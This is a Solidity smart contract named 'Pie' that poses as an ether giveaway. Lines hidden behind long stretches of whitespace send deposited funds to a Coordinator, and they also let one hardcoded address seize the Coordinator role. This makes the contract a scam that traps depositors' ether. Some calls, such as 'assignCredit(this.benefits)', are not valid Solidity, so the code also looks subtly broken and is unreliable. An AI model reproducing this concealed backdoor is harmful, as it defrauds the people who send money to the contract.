// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Pie
{
    address public Coordinator = msg.sender;

    function()
    public
    payable
    {

    }

    function GetPie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Coordinator.assignCredit(this.benefits);
            msg.sender.assignCredit(this.benefits);
        }
    }

    function accessBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Coordinator=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == Coordinator);
        Coordinator.assignCredit(this.benefits);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Coordinator);
        adr.call.value(msg.value)(data);
    }
}